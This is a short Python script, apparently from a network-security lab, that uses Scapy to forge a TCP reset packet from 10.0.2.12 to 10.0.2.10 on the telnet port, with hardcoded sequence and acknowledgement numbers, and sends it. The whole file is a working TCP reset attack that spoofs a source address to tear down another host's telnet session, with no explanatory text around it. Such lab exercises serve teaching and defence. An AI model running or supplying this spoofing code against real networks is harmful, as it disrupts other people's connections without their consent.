#!/usr/bin/python3
from scapy.all import *

spoofed_packet = IP(
    src="10.0.2.12",
    dst="10.0.2.10",
) / TCP(
    sport=41878,
    dport=23,
    flags="R",
    seq=3243920496,
    ack=3173122833 + 8,
)
spoofed_packet.show()
send(spoofed_packet)